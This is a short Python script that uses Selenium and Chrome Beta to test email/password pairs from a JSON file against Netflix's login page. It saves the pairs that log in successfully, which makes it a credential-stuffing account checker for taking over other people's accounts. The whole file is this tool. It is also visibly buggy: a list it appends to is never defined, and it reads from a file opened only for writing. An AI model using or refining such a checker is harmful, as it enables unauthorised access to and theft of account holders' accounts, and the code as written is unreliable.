import json,os,time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys



f = open('logins.json')
data = json.load(f)
f.close()

options = webdriver.ChromeOptions()



## must put your own file path here, to find your file path. use type this into the search bar on a chrome operated browser, chrome://version
## NOTE YOU MUST HAVE https://www.google.com/chrome/beta/ THIS VERSION OF CHROME OR ELSE IT WILL NOT WORK
options.binary_location = r"C:\Program Files\Google\Chrome Beta\Application\chrome.exe"





def login(user, password, driver):
    time.sleep(10)
    email_box = driver.find_element(By.ID, 'id_userLoginId')
    email_box.send_keys(user)
    password_box = driver.find_element(By.ID, 'id_password')
    password_box.send_keys(password)
    signInBox = driver.find_element(By.XPATH, r'//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button')
    time.sleep(0.75)
    signInBox.click()
    time.sleep(0.5)
    return driver.current_url

def saveData(accounts):
    file = open('accountsUseable.txt', 'w')
    for account in accounts:
        file.write(f'{file.read()}\n{account[0]}||{account[1]}\n')
    file.close()

targetUrl = r'https://www.netflix.com/ca/login'
check = 0
for user in data["email"]:
    print(f'[{check}/{len(data["email"])}]')
    B = webdriver.Chrome(f"{os.getcwd()}//driver//chromedriver.exe", chrome_options=options)
    B.get(targetUrl)
    currentUrl = login(user[0], user[1], B)

    if targetUrl != currentUrl:
        useable_accounts.append([user[0], user[1]])
    B.close()

saveData(useable_accounts)